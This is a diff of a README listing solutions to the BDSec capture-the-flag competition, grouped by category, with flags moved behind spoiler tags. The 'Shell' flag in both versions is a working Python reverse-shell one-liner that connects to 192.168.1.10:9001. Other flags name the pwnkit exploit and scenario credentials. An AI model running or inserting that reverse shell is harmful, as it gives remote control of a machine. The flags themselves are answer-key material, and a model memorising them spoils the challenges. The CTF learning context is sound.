@@ -17,53 +17,96 @@ The goal is to solve cybersecurity tests in various categories. The validation o
 
 ## Challenges
 
-| Chall Name                                                       | Category     | Author     | Points | Done | Flag |
-|------------------------------------------------------------------|:-------------:|:----------:|:--------------:|:------:|:---------:|
-| Sound's Good                                    | Stegano          | pmsiam   | 50     | ✘ | `` |
-| Deep Dive Into It !!                                           | Stegano        | pmsiam   | 250     | ✘ | `` |
-| PwnRace                                    | PWN        | froghunter   | 200     | ✔ | `` |
-| BDSec License Checker 0x1                                    | Reverse        | NomanProdhan   | 50     | ✘ | `BDSEC{l1c3n53_ch3ck3r_0x1_2022}` |
-| shashdot                                    | Reverse        | froghunter   | 50     | ✘ | `` |
-| Flag Box                                    | Reverse        |  marufmurtuza   | 100     | ✔ | `` |
-| Simple Math                                    | Reverse        |  marufmurtuza   | 100     | ✔ | `` |
-| Poster                                    | Reverse        |  froghunter   | 100     | ✔ | `` |
-| BDSec License Checker 0x03                                    | Reverse        |  NomanProdhan   | 150     | ✘ | `BDSEC{iTs_lIcEnsE_cHeCker_tHrEE_bDsEc}` |
-| BDSec License Checker 0x02                                    | Reverse        |  NomanProdhan   | 200     | ✘ | `` |
-| Crypto Code                                    | Crypto        | 1xR1FAT   | 25     | ✔ | `BDSEC{cryp70_and_pyth0n_ar3_aw3s0me}` |
-| [VIPx01](https://github.com/Beel0w/BDSecCTF/tree/main/Cryptography/VIPx01)                                    | Crypto        | 1xR1FAT   | 25     | ✔ | `BDSEC{crypt0_ar3_aw3s0m3}` |
-| VIPx02                                    | Crypto        | 1xR1FAT   | 25     | ✘ | `BDSEC{crypt0_ar3_aw3s0m3_&_try_t0_1earn_crypt0}` |
-| [Fake](https://github.com/Beel0w/BDSecCTF/tree/main/Cryptography/Fake)                                    | Crypto        | 1xR1FAT   | 50     | ✔ | `BDSEC{do3sn't_b3li3ve_1n_unkn0wn_mail}` |
-| [Basically RSA](https://github.com/Beel0w/BDSecCTF/tree/main/Cryptography/Basically%20RSA)                                    | Crypto        | dyn   | 100     | ✔ | `DSEC{r54_i5_fUn_r16h7?}` |
-| Dominoes                                    | Crypto        | dyn   | 50     | ✘ | `BDSEC{n0t_50_e45y_hUh?_433}` |
-| Loop Lover                                    | Crypto        | dyn   | 100     | ✘ | `BDSEC{ju57_L00p_m3_4w4y}` |
-| Jungle Templating                                    | WEB        |  0xmahi   | 100     | ✔ | `BDSEC{Y3Y_7H1515_7H3_F146}` |
-| Awesome Note Keeping                                    | WEB        |  NomanProdhan   | 100     | ✔ | `BDSEC{tHe_n0t3_K33p1n6_4W350M3_N5}` |
-| Knight Squad Shop                                    | WEB        |  froghunter   | 100     | ✔ | `BDSEC{mummy_i_can't_write_javaScript}` |
-| [Find The Cost](https://github.com/Beel0w/BDSecCTF/tree/main/Programming/Find%20the%20Cost)                                    | Programing        | marufmurtuza| 100     | ✔ | `BDSEC{35,47}` |
-| Find The Masterpiece                                    | OSINT        | marufmurtuza   | 50     | ✔ | `BDSEC{he’s_a_pirate,2003}` |
-| [Find Rejvi](https://github.com/Beel0w/BDSecCTF/tree/main/OSINT/Find%20Rejvi)                                    | OSINT        | NomanProdhan   | 70     | ✔ | `BDSEC{yoU_goT_m3__oS1nT_I5_fUn_r1Gh7}` |
-| Find Me Inside | OSINT        | Axif   | 50     | ✔ | `BDSEC{M33m_the_butterfly_goes_up_up_and_away}` |
-| [Message of Hufflepuff](https://github.com/Beel0w/BDSecCTF/tree/main/Misc/Message%20of%20Hufflepuff)                                    | Misc        | marufmurtuza   | 50     | ✔ | `BDSEC{Huffm@n_Enc0d1ng_go7_D3COD3D}` |
-| Victim & Attacker | Networking        | TareqAhamed   | 25     | ✔ | `BDSEC{192.168.1.13_192.168.1.10}` |
-| Which FTP ? | Networking        | marufmurtuza   | 50     | ✔ | `BDSEC{vsFTPd_3.0.3}` |
-| FTP Creads | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{ftpadmin_ftpadmin}` |
-| Uploaded File | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{/files/.hacker.not}` |
-| Log Filer | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{vsftpd.log}` |
-| Project Incharge | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{Mark}` |
-| Loooon Looong | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{Thu_Jul_14_10:16:59}` |
-| Administrator | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{demo,demo}` |
-| Shell | Networking        | TareqAhamed   | 50     | ✔ | <details><summary>`BDSEC{....`</summary>`BDSEC{python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'}`</details> |
-| Secret Key | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{2jo3t12nv51w1pw4wk1kj58s1jb6w0}` |
-| Database Admin | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{root_root}` |
-| HostName | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{ftpadmin}` |
-| CodeName | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{xenial}` |
-| Server Info | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{Ubuntu_16.04.1_LTS_Xenial_Xerus}` |
-| Service Exploit | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{polkit}` |
-| Exploit Exploit Exploit | Networking        |  marufmurtuza   | 50     | ✔ | `BDSEC{pwnkit}` |
-| Vulnerable Service | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{pkexec}` |
-| msg.txt | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{The_Server_Is_Now_under_My_Control_:D_:D}` |
-| Attacker | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{N4N0M473}` |
-| Server User's | Networking        | TareqAhamed   | 50     | ✔ | `BDSEC{8}` |  
+### Steganography
+
+| Chall Name | Points | Goal | Flag |
+|------------|:------:|:----:|:----:|
+| Sound's Good ✘|50||``|
+| Deep Dive Into It !! ✘|250||``|
+
+### PWN
+
+| Chall Name|Points|Goal|Flag|
+|----------|:--:|:-:|:-:|
+| PwnRace ✔|200||``|
+
+### Reverse
+
+| Chall Name | Points | Goal | Flag |
+|------------|:------:|:----:|:----:|
+| BDSec License Checker 0x1 ✘|50|| <details><summary>`Spoiler`</summary>`BDSEC{l1c3n53_ch3ck3r_0x1_2022}`</details> |
+| shashdot ✘|50|| `` |
+| Flag Box ✔|100|| `` |
+| Simple Math ✔|100|| `` |
+| Poster ✔|100|| `` |
+| BDSec License Checker 0x03 ✘|150|| <details><summary>`Spoiler`</summary>`BDSEC{iTs_lIcEnsE_cHeCker_tHrEE_bDsEc}`</details> |
+| BDSec License Checker 0x02 ✘|200||``|
+
+### Cryptography
+
+| Chall Name | Points | Goal | Flag |
+|------------|:------:|:----:|:----:|
+|Crypto Code ✔|25||<details><summary>`Spoiler`</summary>`BDSEC{cryp70_and_pyth0n_ar3_aw3s0me}`</details> |
+|[VIPx01 ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Cryptography/VIPx01)|25|| <details><summary>`Spoiler`</summary>`BDSEC{crypt0_ar3_aw3s0m3}`</details> |
+|VIPx02 ✘|25||<details><summary>`Spoiler`</summary>`BDSEC{crypt0_ar3_aw3s0m3_&_try_t0_1earn_crypt0}`</details> |
+|[Fake ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Cryptography/Fake)|50||<details><summary>`Spoiler`</summary>`BDSEC{do3sn't_b3li3ve_1n_unkn0wn_mail}`</details> |
+|[Basically RSA ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Cryptography/Basically%20RSA)|100||<details><summary>`Spoiler`</summary>`DSEC{r54_i5_fUn_r16h7?}`</details> |
+|Dominoes ✘|50||<details><summary>`Spoiler`</summary>`BDSEC{n0t_50_e45y_hUh?_433}`</details> |
+|Loop Lover ✘|100||<details><summary>`Spoiler`</summary>`BDSEC{ju57_L00p_m3_4w4y}`</details> |
+
+### Web
+
+| Chall Name | Points | Goal | Flag |
+|------------|:------:|:----:|:----:|
+|Jungle Templating ✔|100||<details><summary>`Spoiler`</summary>`BDSEC{Y3Y_7H1515_7H3_F146}`</details> |
+|Awesome Note Keeping ✔|100|| <details><summary>`Spoiler`</summary>`BDSEC{tHe_n0t3_K33p1n6_4W350M3_N5}`</details> |
+|Knight Squad Shop ✔|100|| <details><summary>`Spoiler`</summary>`BDSEC{mummy_i_can't_write_javaScript}`</details> |
+
+### Programming
+
+| Chall Name | Points | Goal | Flag |
+|------------|:------:|:----:|:----:|
+|[Find The Cost ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Programming/Find%20the%20Cost)|100|Create an algorithm to calculate the shortest path from a matrix|<details><summary>`Spoiler`</summary>`BDSEC{35,47}`</details> |
+
+### OSINT
+
+| Chall Name | Points | Goal | Flag |
+|------------|:------:|:----:|:----:|
+|[Find The Masterpiece](https://github.com/Beel0w/BDSecCTF/tree/main/OSINT/Find%20The%20Masterpiece) ✔|50|Turn numbers into tone and find the associated music|<details><summary>`Spoiler`</summary>`BDSEC{he’s_a_pirate,2003}`</details> |
+|[Find Rejvi ✔](https://github.com/Beel0w/BDSecCTF/tree/main/OSINT/Find%20Rejvi)|70|Find a person’s profile on social media|<details><summary>`Spoiler`</summary>`BDSEC{yoU_goT_m3__oS1nT_I5_fUn_r1Gh7}`</details> |
+
+
+### Misc
+
+| Chall Name | Points | Goal | Flag |
+|------------|:------:|:----:|:----:|
+|[Message of Hufflepuff ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Misc/Message%20of%20Hufflepuff)                     |50||<details><summary>`Spoiler`</summary>`BDSEC{Huffm@n_Enc0d1ng_go7_D3COD3D}`</details> |
+|Find Me Inside ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{M33m_the_butterfly_goes_up_up_and_away}`</details> |
+
+### Networking
+
+| Chall Name | Points | Goal | Flag |
+|------------|:------:|:----:|:----:|
+|Victim & Attacker ✔|25||<details><summary>`Spoiler`</summary>`BDSEC{192.168.1.13_192.168.1.10}`</details> |
+|Which FTP ? ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{vsFTPd_3.0.3}` |
+|FTP Creads ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{ftpadmin_ftpadmin}`</details> |
+|Uploaded File ✔|50|| <details><summary>`Spoiler`</summary>`BDSEC{/files/.hacker.not}`</details> |
+|Log Filer ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{vsftpd.log}`</details> |
+|Project Incharge ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{Mark}`</details> |
+|Loooon Looong ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{Thu_Jul_14_10:16:59}`</details> |
+|Administrator ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{demo,demo}` |
+|Shell ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'}`</details> |
+|Secret Key ✔|50|| <details><summary>`Spoiler`</summary>`BDSEC{2jo3t12nv51w1pw4wk1kj58s1jb6w0}`</details> |
+|Database Admin ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{root_root}`</details> |
+|HostName ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{ftpadmin}`</details> |
+|CodeName ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{xenial}`</details> |
+|Server Info ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{Ubuntu_16.04.1_LTS_Xenial_Xerus}`</details> |
+|Service Exploit ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{polkit}`</details> |
+|Exploit Exploit Exploit ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{pwnkit}`</details> |
+|Vulnerable Service ✔| 50||<details><summary>`Spoiler`</summary>`BDSEC{pkexec}` |
+|msg.txt ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{The_Server_Is_Now_under_My_Control_:D_:D}`</details> |
+|Attacker ✔|50||<details><summary>`Spoiler`</summary>`BDSEC{N4N0M473}`</details> |
+|Server User's ✔ |50||<details><summary>`Spoiler`</summary>`BDSEC{8}`</details> |  
 
 **Total : 46 Challenges ( 3220 Points )**
  
